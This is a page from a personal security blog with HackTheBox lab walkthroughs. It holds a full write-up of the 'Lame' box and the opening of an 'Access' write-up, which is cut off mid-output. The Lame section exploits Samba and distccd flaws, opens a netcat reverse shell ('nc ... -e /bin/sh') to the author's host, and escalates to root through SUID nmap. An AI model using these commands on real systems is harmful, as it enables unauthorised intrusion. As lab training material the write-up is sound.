<!DOCTYPE html>
<html lang="en-us">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="https://www.offsec.dev/favicon.png">
        <meta name="image" property="og:image" content="https://www.offsec.dev/ogmedia.png">
        <meta name="description" property="og:description" content="Security focused personal blog.">
        <meta name="author" content="Kiril Stefanov">
	<meta name="generator" content="Hugo 0.70.0" />
	
	<title>Posts - | Ethical Hacker | System Administrator | Penetration Tester | Bug Hunter |</title>
	<title>CodePen - Long shadow</title>

	
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto">
	<link href="https://www.offsec.dev/css/bootstrap.min.css" rel="stylesheet">
	<link href="https://www.offsec.dev/css/strange-case.css" rel="stylesheet">
	<link rel="stylesheet" href="https://www.offsec.dev/css/style.css">
	<link rel="stylesheet" href="https://www.offsec.dev/css/menu.css">
	

	
	
	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->

	
	<link href="https://www.offsec.dev/posts/index.xml" rel="alternate" type="application/rss+xml" title="Kiril&#39;s Security Blog" />
</head>
<body class="scheme-slate">
	<canvas id="c"></canvas>


	<div class="container-fluid">
		<div class="row">
			<div class="col-sm-4 col-md-3 col-lg-3 sidebar">

			
	<div class="sidebar-content">
		
		<a href="https://www.offsec.dev"><h1>Kiril&#39;s Security Blog</h1></a>
		<p>| Ethical Hacker | System Administrator | Penetration Tester | Bug Hunter |</p>

		
		<div class="sidebar-freetext">
			<p><script src="https://www.hackthebox.eu/badge/33863"></script></p>
			<p>Nothing Is Private ...</p>
		</div>
		
		<div class="navbar-collapse" id="sidebar-menus">
			<ul class="nav-item dropdown ml-100" style="list-style-type: none;">
			  
			  <li class="dropup">
				
				<a href="https://www.offsec.dev/">Nothing like 127.0.0.1</a>
				
			  </li>
			  
			  <li class="dropup">
				
				<a href="https://www.hackthebox.eu/profile/33863">HTB profile</a>
				
			  </li>
			  
			  <li class="dropup">
				
				<a href="https://www.linkedin.com/in/kiril-stefanov">LinkedIn profile</a>
				
			  </li>
			  
			  <li class="dropup">
				
				  <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Handy Techniques <span class="caret"></span></a>
				<ul class="dropdown-menu dropdown-menu-right" style="left: 166.05px;bottom: 3.4px; overflow: auto;">
				  
					<li><a href="https://www.offsec.dev/posts/enum/">Enumeration</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/shells/">Reverse Shells</a></li>
				  
				</ul>
				
			  </li>
			  
			  <li class="dropup">
				
				  <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">WriteUp section <span class="caret"></span></a>
				<ul class="dropdown-menu dropdown-menu-right" style="left: 166.05px;bottom: 3.4px; overflow: auto;">
				  
					<li><a href="https://www.offsec.dev/posts/cache/">Access</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/aragog">Aragog</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/beep">Beep</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/devel">Devel</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame0</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame1</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame11</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame12</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame13</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame14</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame15</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame16</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame17</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame18</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame19</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame2</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame20</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame21</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame22</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame23</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame24</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame25</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame26</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame27</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame28</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame29</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame3</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame30</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame31</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame4</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame5</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame6</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame7</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame8</a></li>
				  
					<li><a href="https://www.offsec.dev/posts/lame">Lame9</a></li>
				  
				</ul>
				
			  </li>
			  
			</ul>
		</div>

		

		

		<p class="copyright">&copy; 2020. All rights reserved. </p>
		<p class="attr">Powered by <a href="http://gohugo.io">Hugo</a> &amp; <a href="https://github.com/ExchangeRate-API/strange-case">Strange Case</a> (inspired by <a href="https://github.com/poole/hyde">Hyde</a>).</p>

	</div>


			</div>
			<div class="col-sm-7 col-sm-offset-4 col-md-6 col-md-offset-3 col-lg-5 col-lg-offset-3 content">

				
				<div class="post">

					<div class="post-heading">
						<h1><a href="https://www.offsec.dev/posts/lame/">HackTheBox - Lame Walkthrough</a></h1>
						<span>Jul 10, 2019</span>
					</div>

					<p><img src="https://flamesec.com/images/lame/header.png" alt="Lame"></p>
<blockquote>
<p>I decided to start HackTheBox from the beginning and do a writeup while doing every box. The first one in the list is <em>Lame</em>. An easy box based on Metasploitable. Hope those posts can help someone other than me, but in the end I&rsquo;m doing them for learning/note taking - if you have any complaints/suggestions/questions - hit me at twitter.</p>
</blockquote>
<h2 id="1-recon-and-information-gathering">1. Recon and Information gathering</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# nmap -sV -sC 10.10.10.3 -oN base_tcp.nmap
Starting Nmap 7.70 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-07-10 21:14 EEST
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.3
Host is up <span style="color:#f92672">(</span>0.044s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">996</span> filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.25
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">1024</span> 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd <span style="color:#f92672">(</span>DSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">2048</span> 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -2d23h01m54s, deviation: 0s, median: -2d23h01m54s
| smb-os-discovery: 
|   OS: Unix <span style="color:#f92672">(</span>Samba 3.0.20-Debian<span style="color:#f92672">)</span>
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
|_  System time: 2019-07-07T11:12:55-04:00
|_smb2-time: Protocol negotiation failed <span style="color:#f92672">(</span>SMB2<span style="color:#f92672">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 56.99 seconds</code></pre></div>
<h3 id="services">SERVICES</h3>
<h4 id="ftp">FTP</h4>
<p>With my fist look at the nmap results I notice the <code>vsftpd</code> version - <em>2.3.4</em> - and I know I have &ldquo;something&rdquo; here :) Quick search with <code>searchsploit</code> yield results as I remember:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# searchsploit vsftpd
------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                                      |  Path
                                                                                                                                    | <span style="color:#f92672">(</span>/usr/share/exploitdb/<span style="color:#f92672">)</span>
------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
vsftpd 2.0.5 - <span style="color:#e6db74">&#39;CWD&#39;</span> <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span> Remote Memory Consumption                                                                      | exploits/linux/dos/5814.pl
vsftpd 2.0.5 - <span style="color:#e6db74">&#39;deny_file&#39;</span> Option Remote Denial of Service <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                                                      | exploits/windows/dos/31818.sh
vsftpd 2.0.5 - <span style="color:#e6db74">&#39;deny_file&#39;</span> Option Remote Denial of Service <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                                                      | exploits/windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                                                                    | exploits/linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                                                                              | exploits/unix/remote/17491.rb
------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------</code></pre></div>
<p>I&rsquo;ll leave this for a minute and check the other services.</p>
<h4 id="smb">SMB</h4>
<p>As <code>nmap</code> tells me I have <code>smb</code> ports open - 139 and 445. I&rsquo;ll take a look at those after playing with the ftp service.</p>
<h2 id="2-gaining-footholdexploiting">2. Gaining foothold/Exploiting</h2>
<p>Now, the ftp service. That version of vsftpd is backdoored - <a href="https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html">https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html</a>. Lets copy the script from the <code>searchsploit</code> result to my working directory:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# searchsploit -m exploits/unix/remote/17491.rb
  Exploit: vsftpd 2.3.4 - Backdoor Command Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>
      URL: https://www.exploit-db.com/exploits/17491
     Path: /usr/share/exploitdb/exploits/unix/remote/17491.rb
File Type: Ruby script, ASCII text, with CRLF line terminators

Copied to: /hackthebox/lame/17491.rb</code></pre></div>
<p>The script is for <code>metasploit</code> but since I have some far away plans of taking OSCP - I&rsquo;ll do my best to skip using it (or at least skip it as a primary tool&hellip;). Looking throught the script it looks like I have to send a smiley face: <code>:)</code> on the <code>USER</code> input and&hellip; uh-oh&hellip; it errors out if there&rsquo;s anonymous login enabled. Guess I can&rsquo;t exploit that now. Also there are no files/folders in the anonymous ftp - what a let down :/. So I&rsquo;ll check the smb then:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# smbclient -L 10.10.10.3
Enter WORKGROUP<span style="color:#ae81ff">\r</span>oot<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service <span style="color:#f92672">(</span>lame server <span style="color:#f92672">(</span>Samba 3.0.20-Debian<span style="color:#f92672">))</span>
	ADMIN$          IPC       IPC Service <span style="color:#f92672">(</span>lame server <span style="color:#f92672">(</span>Samba 3.0.20-Debian<span style="color:#f92672">))</span>
Reconnecting with SMB1 <span style="color:#66d9ef">for</span> workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            LAME</code></pre></div>
<p>Mm now I have something more interesting. Lets check my permissions:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# smbmap -H 10.10.10.3
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Finding open SMB ports....
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User SMB session establishd on 10.10.10.3...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 10.10.10.3:445	Name: 10.10.10.3                                        
	Disk                                                  	Permissions
	----                                                  	-----------
	print$                                            	NO ACCESS
	tmp                                               	READ, WRITE
	opt                                               	NO ACCESS
	IPC$                                              	NO ACCESS
	ADMIN$                                            	NO ACCESS</code></pre></div>
<p>Oh, look at that - I can read/write to tmp&hellip; but not that useful at the moment</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# smbclient //10.10.10.3<span style="color:#ae81ff">\\</span>tmp
Enter WORKGROUP<span style="color:#ae81ff">\r</span>oot<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Anonymous login successful
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Sun Jul  <span style="color:#ae81ff">7</span> 18:48:37 <span style="color:#ae81ff">2019</span>
  ..                                 DR        <span style="color:#ae81ff">0</span>  Sun May <span style="color:#ae81ff">20</span> 21:36:12 <span style="color:#ae81ff">2012</span>
  .ICE-unix                          DH        <span style="color:#ae81ff">0</span>  Sun Jul  <span style="color:#ae81ff">7</span> 18:10:18 <span style="color:#ae81ff">2019</span>
  .X11-unix                          DH        <span style="color:#ae81ff">0</span>  Sun Jul  <span style="color:#ae81ff">7</span> 18:10:42 <span style="color:#ae81ff">2019</span>
  .X0-lock                           HR       <span style="color:#ae81ff">11</span>  Sun Jul  <span style="color:#ae81ff">7</span> 18:10:42 <span style="color:#ae81ff">2019</span>
  5144.jsvc_up                        R        <span style="color:#ae81ff">0</span>  Sun Jul  <span style="color:#ae81ff">7</span> 18:11:24 <span style="color:#ae81ff">2019</span>

		<span style="color:#ae81ff">7282168</span> blocks of size 1024. <span style="color:#ae81ff">5678792</span> blocks available
smb: <span style="color:#ae81ff">\&gt;</span> </code></pre></div>
<p>Searching about smb version 3.0.20 I get an interesting result - CVE-2007-2447 - Samba &ldquo;username map script&rdquo; Command Execution. And since I want to skip the metasploit some googling leads me to this script <a href="https://gist.githubusercontent.com/joenorton8014/19aaa00e0088738fc429cff2669b9851/raw/6e1ae37e0061be103fd733b16266d26379a7f4ba/samba-usermap-exploit.py">https://gist.githubusercontent.com/joenorton8014/19aaa00e0088738fc429cff2669b9851/raw/6e1ae37e0061be103fd733b16266d26379a7f4ba/samba-usermap-exploit.py</a></p>
<p>Generating new payload for my host and substituting it in the script + installing <code>pysmb</code> with <code>pip</code> and executing&hellip; BAM! Got root..</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Ncat: Connection from 10.10.10.3:55941.
id
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span></code></pre></div>
<p>That was easy.. I&rsquo;ll forget I have the shell and check if there&rsquo;s something more.</p>
<p>Let&rsquo;s enumerate some more and check all ports</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# nmap -p- 10.10.10.3 -oN all_tcp.nmap
Starting Nmap 7.70 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-07-10 22:53 EEST
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.3
Host is up <span style="color:#f92672">(</span>0.036s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65530</span> filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd</code></pre></div>
<p>Uh-oh <code>distccd</code>&hellip; Now that&rsquo;s interesting. Googling around I found this: <a href="https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html">https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html</a> and the nse script <a href="https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse">https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse</a> :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# wget https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse -O /usr/share/nmap/scripts/distcc-exec.nse
--2019-07-10 23:05:45--  https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse
Resolving svn.nmap.org <span style="color:#f92672">(</span>svn.nmap.org<span style="color:#f92672">)</span>... 45.33.49.119, 2600:3c01::f03c:91ff:fe98:ff4e
Connecting to svn.nmap.org <span style="color:#f92672">(</span>svn.nmap.org<span style="color:#f92672">)</span>|45.33.49.119|:443... connected.
HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
Length: <span style="color:#ae81ff">3519</span> <span style="color:#f92672">(</span>3.4K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>text/plain<span style="color:#f92672">]</span>
Saving to: ‘/usr/share/nmap/scripts/distcc-exec.nse’

/usr/share/nmap/scripts/distcc-exec.nse     100%<span style="color:#f92672">[========================================================================================</span>&gt;<span style="color:#f92672">]</span>   3.44K  --.-KB/s    in 0s      

2019-07-10 23:05:46 <span style="color:#f92672">(</span><span style="color:#ae81ff">186</span> MB/s<span style="color:#f92672">)</span> - ‘/usr/share/nmap/scripts/distcc-exec.nse’ saved <span style="color:#f92672">[</span>3519/3519<span style="color:#f92672">]</span>

root@warmachine:/hackthebox/lame# 
root@warmachine:/hackthebox/lame# nmap -p <span style="color:#ae81ff">3632</span> 10.10.10.3 --script distcc-exec --script-args<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;distcc-exec.cmd=&#39;id&#39;&#34;</span>
Starting Nmap 7.70 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-07-10 23:06 EEST
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.3
Host is up <span style="color:#f92672">(</span>0.040s latency<span style="color:#f92672">)</span>.

PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-exec: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE <span style="color:#f92672">(</span>Exploitable<span style="color:#f92672">)</span>
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 <span style="color:#f92672">(</span>HIGH<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>AV:N/AC:M/Au:N/C:C/I:C/A:C<span style="color:#f92672">)</span>
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span>
|   
|     References:
|       https://distcc.github.io/security.html
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2004-2687

Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.52 seconds</code></pre></div>
<p>Finally - let&rsquo;s get shell</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# nmap -p <span style="color:#ae81ff">3632</span> 10.10.10.3 --script distcc-exec --script-args<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;distcc-exec.cmd=&#39;/bin/nc 10.10.14.25 4747 -e /bin/sh&#39;&#34;</span>
Starting Nmap 7.70 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-07-10 23:27 EEST


root@warmachine:/hackthebox/lame# nc -lvnp <span style="color:#ae81ff">4747</span>
Ncat: Version 7.70 <span style="color:#f92672">(</span> https://nmap.org/ncat <span style="color:#f92672">)</span>
Ncat: Listening on :::4747
Ncat: Listening on 0.0.0.0:4747
Ncat: Connection from 10.10.10.3.
Ncat: Connection from 10.10.10.3:34633.
id
uid<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span></code></pre></div>
<h2 id="3-enumerating-the-system">3. Enumerating the system</h2>
<p>First thing - first: <code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code> and then - <code>LinEnum.sh</code></p>
<p>Interesting stuff:</p>
<pre><code>[+] Possibly interesting SUID files:
-rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap
-rwsr-xr-x 1 root root 46084 Mar 31  2008 /usr/bin/mtr
</code></pre><p><em>Whoa!</em> that&rsquo;s almost like metasploitable :D Oh, wait</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">daemon@lame:/tmp$ cat /root/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w<span style="color:#f92672">==</span> msfadmin@metasploitable</code></pre></div>
<p>not <em>like</em>, I guess&hellip;</p>
<p>I&rsquo;ll play with the SUIDs  - with the help of gtfobins - <a href="https://gtfobins.github.io">https://gtfobins.github.io</a></p>
<h4 id="nmap-suid">nmap SUID</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">daemon@lame:/tmp$ nmap --interactive
nmap --interactive

Starting Nmap V. 4.53 <span style="color:#f92672">(</span> http://insecure.org <span style="color:#f92672">)</span>
Welcome to Interactive Mode -- press h &lt;enter&gt; <span style="color:#66d9ef">for</span> help
nmap&gt; !sh
!sh
sh-3.2# id
id
uid<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span>
sh-3.2# cat /root/root.txt
cat /root/root.txt
&lt;...&gt;

sh-3.2# cat /home/makis/user.txt
cat /home/makis/user.txt
&lt;...&gt;</code></pre></div>
<p>For some reason I couldn&rsquo;t make the <code>mtr</code> SUID work&hellip; it errors out? :/</p>
<p>That&rsquo;s pretty much it&hellip; a lot of vulnerabilities and misconfigurations. <code>LinEnum.sh</code> showed more interesting stuff but looking at them I think they were &ldquo;patched&rdquo; for the sake of making the machine not that vulnerable.</p>


				</div>
				
				<div class="post">

					<div class="post-heading">
						<h1><a href="https://www.offsec.dev/posts/cache/">HackTheBox - Access Walkthrough</a></h1>
						<span>Mar 2, 2019</span>
					</div>

					<p><img src="https://flamesec.com/images/access/header.png" alt="Access"></p>
<h2 id="1-recon-and-information-gathering">1. Recon and Information gathering</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╭─root@warmachine ~/hackthebox/access
╰─# cat base_tcp.nmap
<span style="color:#75715e"># Nmap 7.70 scan initiated Sun Feb 24 22:40:43 2019 as: nmap -sV -sC -oN base_tcp.nmap 10.10.10.98</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.98
Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">997</span> filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
|_Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t get directory listing: PASV failed: <span style="color:#ae81ff">425</span> Cannot open data connection.
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre></div>
<h3 id="services">SERVICES</h3>
<h4 id="iishttp">IIS/HTTP</h4>
<p>Running <code>gobuster</code> here while poking around the other services gets me only <code>aspnet_client/system_web</code> which is pretty much useless for me. On to the interesting stuff&hellip;</p>
<h4 id="telnet">Telnet</h4>
<p>Connecting to telnet (port 23/tcp) leads me to a login prompt for <code>Welcome to Microsoft Telnet Service</code>. Sadly, trying couple of common passwords doesn&rsquo;t result in successful login.</p>
<h4 id="ftp">FTP</h4>
<p>Okay, so I have a ftp server with anonymous login. The error regarding directory listing is caused my the <code>PASSV</code> mode - disabling it allows me to list the directories and see there are two of them:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">lftp 10.10.10.98:~&gt; set ftp:passive-mode off
lftp 10.10.10.98:~&gt; ls
08-23-18  08:16PM       &lt;DIR&gt;          Backups
08-24-18  09:00PM       &lt;DIR&gt;          Engineer</code></pre></div>
<p>And inside I can see <code>Access Control.zip</code> and <code>backup.mdb</code>. The first is a password protected archive and the second - MS Access db.</p>
<h4 id="backupmdb">backup.mdb</h4>
<p>I used mdb-tools (as most would do after googling how to open mdb in Kali :D) and after playing a bit with the different commands I found the table I needed:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╭─root@warmachine ~/hackthebox/access  
╰─# mdb-export backup.mdb auth_user                                                                                                                                                                            <span style="color:#ae81ff">1</span> ↵
id,username,password,Status,last_login,RoleID,Remark
